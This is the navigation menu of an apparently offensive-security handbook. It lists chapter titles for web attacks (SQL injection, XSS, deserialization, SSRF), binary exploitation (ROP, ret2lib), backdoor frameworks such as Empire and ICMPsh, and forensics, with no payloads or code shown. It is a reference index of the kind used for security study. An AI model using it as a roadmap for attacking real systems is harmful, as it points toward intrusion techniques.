        <li class="chapter " data-level="6.66" data-path="../../pentesting/15672-pentesting-rabbitmq-management.html">
            
                <a href="../../pentesting/15672-pentesting-rabbitmq-management.html">
            
                    
                    15672 - Pentesting RabbitMQ Management
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.67" data-path="../../pentesting/27017-27018-mongodb.html">
            
                <a href="../../pentesting/27017-27018-mongodb.html">
            
                    
                    27017,27018 - Pentesting MongoDB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.68" data-path="../../pentesting/44818-ethernetip.html">
            
                <a href="../../pentesting/44818-ethernetip.html">
            
                    
                    44818/UDP/TCP - Pentesting EthernetIP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.69" data-path="../../pentesting/47808-udp-bacnet.html">
            
                <a href="../../pentesting/47808-udp-bacnet.html">
            
                    
                    47808/udp - Pentesting BACNet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="6.70" data-path="../../pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.html">
            
                <a href="../../pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.html">
            
                    
                    50030,50060,50070,50075,50090 - Pentesting Hadoop
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Pentesting Web</li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="../../pentesting-web/2fa-bypass.html">
            
                <a href="../../pentesting-web/2fa-bypass.html">
            
                    
                    2FA Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="../../pentesting-web/abusing-hop-by-hop-headers.html">
            
                <a href="../../pentesting-web/abusing-hop-by-hop-headers.html">
            
                    
                    Abusing hop-by-hop headers
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.3" data-path="../../pentesting-web/bypass-payment-process.html">
            
                <a href="../../pentesting-web/bypass-payment-process.html">
            
                    
                    Bypass Payment Process
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.4" data-path="../../pentesting-web/captcha-bypass.html">
            
                <a href="../../pentesting-web/captcha-bypass.html">
            
                    
                    Captcha Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.5" data-path="../../pentesting-web/cache-deception.html">
            
                <a href="../../pentesting-web/cache-deception.html">
            
                    
                    Cache Poisoning and Cache Deception
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.6" data-path="../../pentesting-web/clickjacking.html">
            
                <a href="../../pentesting-web/clickjacking.html">
            
                    
                    Clickjacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.7" data-path="../../pentesting-web/client-side-template-injection-csti.html">
            
                <a href="../../pentesting-web/client-side-template-injection-csti.html">
            
                    
                    Client Side Template Injection (CSTI)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.8" data-path="../../pentesting-web/command-injection.html">
            
                <a href="../../pentesting-web/command-injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.9" data-path="../../pentesting-web/content-security-policy-csp-bypass.html">
            
                <a href="../../pentesting-web/content-security-policy-csp-bypass.html">
            
                    
                    Content Security Policy (CSP) Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.10" data-path="../../pentesting-web/hacking-with-cookies.html">
            
                <a href="../../pentesting-web/hacking-with-cookies.html">
            
                    
                    Cookies Hacking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.11" data-path="../../pentesting-web/cors-bypass.html">
            
                <a href="../../pentesting-web/cors-bypass.html">
            
                    
                    CORS - Misconfigurations & Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.12" data-path="../../pentesting-web/crlf-0d-0a.html">
            
                <a href="../../pentesting-web/crlf-0d-0a.html">
            
                    
                    CRLF (%0D%0A) Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.13" data-path="../../pentesting-web/cross-site-websocket-hijacking-cswsh.html">
            
                <a href="../../pentesting-web/cross-site-websocket-hijacking-cswsh.html">
            
                    
                    Cross-site WebSocket hijacking (CSWSH)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.14" data-path="../../pentesting-web/csrf-cross-site-request-forgery.html">
            
                <a href="../../pentesting-web/csrf-cross-site-request-forgery.html">
            
                    
                    CSRF (Cross Site Request Forgery)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.15" data-path="../../pentesting-web/dangling-markup-html-scriptless-injection.html">
            
                <a href="../../pentesting-web/dangling-markup-html-scriptless-injection.html">
            
                    
                    Dangling Markup - HTML scriptless injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16" data-path="../../pentesting-web/deserialization/">
            
                <a href="../../pentesting-web/deserialization/">
            
                    
                    Deserialization
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.16.1" data-path="../../pentesting-web/deserialization/nodejs-deserialization-__proto__-abuse.html">
            
                <a href="../../pentesting-web/deserialization/nodejs-deserialization-__proto__-abuse.html">
            
                    
                    NodeJS deserialization __proto__ abuse
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.2" data-path="../../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html">
            
                <a href="../../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html">
            
                    
                    Java JSF ViewState (.faces) Deserialization
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.3" data-path="../../pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe.html">
            
                <a href="../../pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe.html">
            
                    
                    Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.4" data-path="../../pentesting-web/deserialization/basic-java-deserialization-objectinputstream-readobject.html">
            
                <a href="../../pentesting-web/deserialization/basic-java-deserialization-objectinputstream-readobject.html">
            
                    
                    Basic Java Deserialization (ObjectInputStream, readObject)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.5" data-path="../../pentesting-web/deserialization/java-transformers-to-rutime-exec-payload.html">
            
                <a href="../../pentesting-web/deserialization/java-transformers-to-rutime-exec-payload.html">
            
                    
                    CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.6" data-path="../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html">
            
                <a href="../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html">
            
                    
                    Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.16.7" data-path="../../pentesting-web/deserialization/exploiting-__viewstate-parameter.html">
            
                <a href="../../pentesting-web/deserialization/exploiting-__viewstate-parameter.html">
            
                    
                    Exploiting __VIEWSTATE parameter
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.17" data-path="../../pentesting-web/email-header-injection.html">
            
                <a href="../../pentesting-web/email-header-injection.html">
            
                    
                    Email Header Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.18" data-path="../../pentesting-web/file-inclusion.html">
            
                <a href="../../pentesting-web/file-inclusion.html">
            
                    
                    File Inclusion/Path traversal
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.19" data-path="../../pentesting-web/file-upload/">
            
                <a href="../../pentesting-web/file-upload/">
            
                    
                    File Upload
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.19.1" data-path="../../pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass.md">
            
                <span>
            
                    
                    PDF Upload - XXE and CORS bypass
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.20" data-path="../../pentesting-web/http-request-smuggling.html">
            
                <a href="../../pentesting-web/http-request-smuggling.html">
            
                    
                    HTTP Request Smuggling / HTTP Desync Attack
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.21" data-path="../../pentesting-web/idor.html">
            
                <a href="../../pentesting-web/idor.html">
            
                    
                    IDOR
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.22" data-path="../../pentesting-web/hacking-jwt-json-web-tokens.html">
            
                <a href="../../pentesting-web/hacking-jwt-json-web-tokens.html">
            
                    
                    JWT Vulnerabilities (Json Web Tokens)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.23" data-path="../../pentesting-web/nosql-injection.html">
            
                <a href="../../pentesting-web/nosql-injection.html">
            
                    
                    NoSQL injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.24" data-path="../../pentesting-web/ldap-injection.html">
            
                <a href="../../pentesting-web/ldap-injection.html">
            
                    
                    LDAP Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.25" data-path="../../pentesting-web/oauth-to-account-takeover.html">
            
                <a href="../../pentesting-web/oauth-to-account-takeover.html">
            
                    
                    OAuth to Account takeover
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.26" data-path="../../pentesting-web/open-redirect.html">
            
                <a href="../../pentesting-web/open-redirect.html">
            
                    
                    Open Redirect
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.27" data-path="../../pentesting-web/parameter-pollution.html">
            
                <a href="../../pentesting-web/parameter-pollution.html">
            
                    
                    Parameter Pollution
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.28" data-path="../../pentesting-web/race-condition.html">
            
                <a href="../../pentesting-web/race-condition.html">
            
                    
                    Race Condition
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.29" data-path="../../pentesting-web/rate-limit-bypass.html">
            
                <a href="../../pentesting-web/rate-limit-bypass.html">
            
                    
                    Rate Limit Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30" data-path="../../pentesting-web/sql-injection/">
            
                <a href="../../pentesting-web/sql-injection/">
            
                    
                    SQL Injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.1" data-path="../../pentesting-web/sql-injection/mssql-injection.html">
            
                <a href="../../pentesting-web/sql-injection/mssql-injection.html">
            
                    
                    MSSQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.2" data-path="../../pentesting-web/sql-injection/oracle-injection.html">
            
                <a href="../../pentesting-web/sql-injection/oracle-injection.html">
            
                    
                    Oracle injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3" data-path="../../pentesting-web/sql-injection/postgresql-injection/">
            
                <a href="../../pentesting-web/sql-injection/postgresql-injection/">
            
                    
                    PostgreSQL injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.3.1" data-path="../../pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration.html">
            
                <a href="../../pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration.html">
            
                    
                    dblink/lo_import data exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.2" data-path="../../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html">
            
                <a href="../../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html">
            
                    
                    PL/pgSQL Password Bruteforce
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.3" data-path="../../pentesting-web/sql-injection/postgresql-injection/network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.html">
            
                <a href="../../pentesting-web/sql-injection/postgresql-injection/network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.html">
            
                    
                    Network - Privesc, Port Scanner and NTLM chanllenge response disclosure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.4" data-path="../../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.html">
            
                <a href="../../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.html">
            
                    
                    Big Binary Files Upload (PostgreSQL)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.30.3.5" data-path="../../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html">
            
                <a href="../../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html">
            
                    
                    RCE with PostgreSQL Extensions
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.30.4" data-path="../../pentesting-web/sql-injection/mysql-injection/">
            
                <a href="../../pentesting-web/sql-injection/mysql-injection/">
            
                    
                    MySQL injection
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.4.1" data-path="../../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.html">
            
                <a href="../../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.html">
            
                    
                    Mysql SSRF
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.30.5" data-path="../../pentesting-web/sql-injection/sqlmap/">
            
                <a href="../../pentesting-web/sql-injection/sqlmap/">
            
                    
                    SQLMap - Cheetsheat
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.30.5.1" data-path="../../pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html">
            
                <a href="../../pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html">
            
                    
                    Second Order Injection - SQLMap
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.31" data-path="../../pentesting-web/ssrf-server-side-request-forgery.html">
            
                <a href="../../pentesting-web/ssrf-server-side-request-forgery.html">
            
                    
                    SSRF (Server Side Request Forgery)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.32" data-path="../../pentesting-web/ssti-server-side-template-injection.html">
            
                <a href="../../pentesting-web/ssti-server-side-template-injection.html">
            
                    
                    SSTI (Server Side Template Injection)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.33" data-path="../../pentesting-web/domain-subdomain-takeover.html">
            
                <a href="../../pentesting-web/domain-subdomain-takeover.html">
            
                    
                    Domain/Subdomain takeover
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.34" data-path="../../pentesting-web/unicode-normalization-vulnerability.html">
            
                <a href="../../pentesting-web/unicode-normalization-vulnerability.html">
            
                    
                    Unicode Normalization vulnerability
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.35" data-path="../../pentesting-web/web-tool-wfuzz.html">
            
                <a href="../../pentesting-web/web-tool-wfuzz.html">
            
                    
                    Web Tool - WFuzz
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.36" data-path="../../pentesting-web/xpath-injection.html">
            
                <a href="../../pentesting-web/xpath-injection.html">
            
                    
                    XPATH injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.37" data-path="../../pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations.html">
            
                <a href="../../pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations.html">
            
                    
                    XSLT Server Side Injection (Extensible Stylesheet Languaje Transformations)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.38" data-path="../../pentesting-web/xxe-xee-xml-external-entity.html">
            
                <a href="../../pentesting-web/xxe-xee-xml-external-entity.html">
            
                    
                    XXE - XEE - XML External Entity
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.39" data-path="../../pentesting-web/xss-cross-site-scripting/">
            
                <a href="../../pentesting-web/xss-cross-site-scripting/">
            
                    
                    XSS (Cross Site Scripting)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="7.39.1" data-path="../../pentesting-web/xss-cross-site-scripting/dom-xss.html">
            
                <a href="../../pentesting-web/xss-cross-site-scripting/dom-xss.html">
            
                    
                    DOM XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.39.2" data-path="../../pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html">
            
                <a href="../../pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html">
            
                    
                    Server Side XSS (Dynamic PDF)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.39.3" data-path="../../pentesting-web/xss-cross-site-scripting/xss-tools.html">
            
                <a href="../../pentesting-web/xss-cross-site-scripting/xss-tools.html">
            
                    
                    XSS Tools
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="7.40" data-path="../../pentesting-web/xssi-cross-site-script-inclusion.html">
            
                <a href="../../pentesting-web/xssi-cross-site-script-inclusion.html">
            
                    
                    XSSI (Cross-Site Script Inclusion)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.41" data-path="../../pentesting-web/xs-search.html">
            
                <a href="../../pentesting-web/xs-search.html">
            
                    
                    XS-Search
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Physical attacks</li>
        
        
    
        <li class="chapter " data-level="8.1" data-path="../../physical-attacks/physical-attacks.html">
            
                <a href="../../physical-attacks/physical-attacks.html">
            
                    
                    Physical Attacks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.2" data-path="../../physical-attacks/escaping-from-gui-applications/">
            
                <a href="../../physical-attacks/escaping-from-gui-applications/">
            
                    
                    Escaping from KIOSKs
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="8.2.1" data-path="../../physical-attacks/escaping-from-gui-applications/show-file-extensions.html">
            
                <a href="../../physical-attacks/escaping-from-gui-applications/show-file-extensions.html">
            
                    
                    Show file extensions
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Exploiting</li>
        
        
    
        <li class="chapter active" data-level="9.1" data-path="./">
            
                <a href="./">
            
                    
                    Linux Exploiting (Basic) (SPA)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.1.1" data-path="rop-syscall-execv.html">
            
                <a href="rop-syscall-execv.html">
            
                    
                    ROP - Syscall execv
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.2" data-path="rop-leaking-libc-address.html">
            
                <a href="rop-leaking-libc-address.html">
            
                    
                    ROP - Leaking LIBC address
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.3" data-path="bypassing-canary-and-pie.html">
            
                <a href="bypassing-canary-and-pie.html">
            
                    
                    Bypassing Canary & PIE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.4" data-path="ret2lib.html">
            
                <a href="ret2lib.html">
            
                    
                    Ret2Lib
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.1.5" data-path="fusion.html">
            
                <a href="fusion.html">
            
                    
                    Fusion
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.2" data-path="../tools/">
            
                <a href="../tools/">
            
                    
                    Exploiting Tools
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="9.2.1" data-path="../tools/pwntools.html">
            
                <a href="../tools/pwntools.html">
            
                    
                    PwnTools
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="9.3" data-path="../windows-exploiting-basic-guide-oscp-lvl.html">
            
                <a href="../windows-exploiting-basic-guide-oscp-lvl.html">
            
                    
                    Windows Exploiting (Basic Guide - OSCP lvl)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="9.4" data-path="../reversing.html">
            
                <a href="../reversing.html">
            
                    
                    Reversing
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Forensics</li>
        
        
    
        <li class="chapter " data-level="10.1" data-path="../../forensics/malware-analysis.html">
            
                <a href="../../forensics/malware-analysis.html">
            
                    
                    Malware Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.2" data-path="../../forensics/memory-dump-analysis.html">
            
                <a href="../../forensics/memory-dump-analysis.html">
            
                    
                    Memory dump analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.3" data-path="../../forensics/pcaps-analysis/">
            
                <a href="../../forensics/pcaps-analysis/">
            
                    
                    Pcaps analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="10.3.1" data-path="../../forensics/pcaps-analysis/usb-keyboard-pcap-analysis.html">
            
                <a href="../../forensics/pcaps-analysis/usb-keyboard-pcap-analysis.html">
            
                    
                    USB Keyboard pcap analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.3.2" data-path="../../forensics/pcaps-analysis/dnscat-exfiltration.html">
            
                <a href="../../forensics/pcaps-analysis/dnscat-exfiltration.html">
            
                    
                    DNSCat pcap analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.3.3" data-path="../../forensics/pcaps-analysis/wireshark-tricks.html">
            
                <a href="../../forensics/pcaps-analysis/wireshark-tricks.html">
            
                    
                    WireShark tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="10.4" data-path="../../forensics/volatility-examples.html">
            
                <a href="../../forensics/volatility-examples.html">
            
                    
                    Volatility - Examples
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5" data-path="../../forensics/basic-forensics-esp/">
            
                <a href="../../forensics/basic-forensics-esp/">
            
                    
                    Basic Forensics (ESP)
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="10.5.1" data-path="../../forensics/basic-forensics-esp/usb-logs-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/usb-logs-analysis.html">
            
                    
                    USB logs analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.2" data-path="../../forensics/basic-forensics-esp/desofuscation-vbs-cscript.exe.html">
            
                <a href="../../forensics/basic-forensics-esp/desofuscation-vbs-cscript.exe.html">
            
                    
                    Desofuscation vbs (cscript.exe)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.3" data-path="../../forensics/basic-forensics-esp/.pyc.html">
            
                <a href="../../forensics/basic-forensics-esp/.pyc.html">
            
                    
                    .pyc
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.4" data-path="../../forensics/basic-forensics-esp/office-file-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/office-file-analysis.html">
            
                    
                    Office file analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.5" data-path="../../forensics/basic-forensics-esp/video-and-audio-file-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/video-and-audio-file-analysis.html">
            
                    
                    Video and Audio file analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.6" data-path="../../forensics/basic-forensics-esp/pdf-file-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/pdf-file-analysis.html">
            
                    
                    PDF File analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.7" data-path="../../forensics/basic-forensics-esp/file-system-analysis.html">
            
                <a href="../../forensics/basic-forensics-esp/file-system-analysis.html">
            
                    
                    File System Analysis
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.8" data-path="../../forensics/basic-forensics-esp/png-tricks.html">
            
                <a href="../../forensics/basic-forensics-esp/png-tricks.html">
            
                    
                    PNG tricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="10.5.9" data-path="../../forensics/basic-forensics-esp/zips-tricks.html">
            
                <a href="../../forensics/basic-forensics-esp/zips-tricks.html">
            
                    
                    ZIPs tricks
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Crypto</li>
        
        
    
        <li class="chapter " data-level="11.1" data-path="../../crypto/certificates.html">
            
                <a href="../../crypto/certificates.html">
            
                    
                    Certificates
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.2" data-path="../../crypto/electronic-code-book-ecb.html">
            
                <a href="../../crypto/electronic-code-book-ecb.html">
            
                    
                    Electronic Code Book (ECB)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.3" data-path="../../crypto/cipher-block-chaining-cbc-mac-priv.html">
            
                <a href="../../crypto/cipher-block-chaining-cbc-mac-priv.html">
            
                    
                    Cipher Block Chaining CBC-MAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.4" data-path="../../crypto/padding-oracle-priv.html">
            
                <a href="../../crypto/padding-oracle-priv.html">
            
                    
                    Padding Oracle
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.5" data-path="../../crypto/rc4-encrypt-and-decrypt.html">
            
                <a href="../../crypto/rc4-encrypt-and-decrypt.html">
            
                    
                    RC4 - Encrypt&Decrypt
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="11.6" data-path="../../crypto/crypto-ctfs-tricks.html">
            
                <a href="../../crypto/crypto-ctfs-tricks.html">
            
                    
                    Crypto CTFs Tricks
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">BACKDOORS</li>
        
        
    
        <li class="chapter " data-level="12.1" data-path="../../backdoors/merlin.html">
            
                <a href="../../backdoors/merlin.html">
            
                    
                    Merlin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="12.2" data-path="../../backdoors/empire.html">
            
                <a href="../../backdoors/empire.html">
            
                    
                    Empire
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="12.3" data-path="../../backdoors/salseo.html">
            
                <a href="../../backdoors/salseo.html">
            
                    
                    Salseo
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="12.4" data-path="../../backdoors/icmpsh.html">
            
                <a href="../../backdoors/icmpsh.html">
            
                    
                    ICMPsh
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Stego</li>
        
        
    
        <li class="chapter " data-level="13.1" data-path="../../stego/stego-tricks.html">
            
                <a href="../../stego/stego-tricks.html">
            
                    
                    Stego Tricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="13.2" data-path="../../stego/esoteric-languages.html">
            
                <a href="../../stego/esoteric-languages.html">
            
                    
                    Esoteric languages
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">MISC</li>
        
        
    
        <li class="chapter " data-level="14.1" data-path="../../misc/basic-python/">
            
                <a href="../../misc/basic-python/">
            
                    
                    Basic Python
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="14.1.1" data-path="../../misc/basic-python/venv.html">
            
                <a href="../../misc/basic-python/venv.html">
            
                    
                    venv
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.2" data-path="../../misc/basic-python/bypass-python-sandboxes.html">
            
                <a href="../../misc/basic-python/bypass-python-sandboxes.html">
            
                    
                    Bypass Python sandboxes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.3" data-path="../../misc/basic-python/magic-methods.html">
            
                <a href="../../misc/basic-python/magic-methods.html">
            
                    
                    Magic Methods
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.4" data-path="../../misc/basic-python/web-requests.html">
            
                <a href="../../misc/basic-python/web-requests.html">
            
                    
                    Web Requests
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.5" data-path="../../misc/basic-python/bruteforce-hash-few-chars.html">
            
                <a href="../../misc/basic-python/bruteforce-hash-few-chars.html">
            
                    
                    Bruteforce hash (few chars)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="14.1.6" data-path="../../misc/basic-python/rop-pwn-template.html">
            
                <a href="../../misc/basic-python/rop-pwn-template.html">
            
                    
                    ROP-PWN template
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="14.2" data-path="../../misc/references.html">
            
                <a href="../../misc/references.html">
            
                    
                    Other Big References
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">TODO</li>
        
        
    
        <li class="chapter " data-level="15.1" data-path="../../todo/more-tools.html">
            
                <a href="../../todo/more-tools.html">
            
                    
                    More Tools
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="15.2" data-path="../../todo/misc.html">
            
                <a href="../../todo/misc.html">
            
                    
                    MISC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="15.3" data-path="../../todo/pentesting-dns.html">
            
                <a href="../../todo/pentesting-dns.html">
            
                    
                    Pentesting DNS
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="16.1" data-path="../../general/burp-suite.html">
            
                <a href="../../general/burp-suite.html">
            
                    
                    Burp Suite
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.2" data-path="../../general/other-web-tricks.html">
            
                <a href="../../general/other-web-tricks.html">
            
                    
                    Other Web Tricks
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.3" data-path="../../general/interesting-http.html">
            
                <a href="../../general/interesting-http.html">
            
                    
                    Interesting HTTP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.4" data-path="../../general/emails-vulns.html">
            
                <a href="../../general/emails-vulns.html">
            
                    
                    Emails Vulnerabilities
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.5" data-path="../../general/cloud-security-review.html">
            
                <a href="../../general/cloud-security-review.html">
            
                    
                    Cloud security review
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.6" data-path="../../general/android-forensics.md">
            
                <span>
            
                    
                    Android Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.7" data-path="../../general/tr-069.html">
            
                <a href="../../general/tr-069.html">
            
                    
                    TR-069
            
                </a>
            

            
        </li>
    
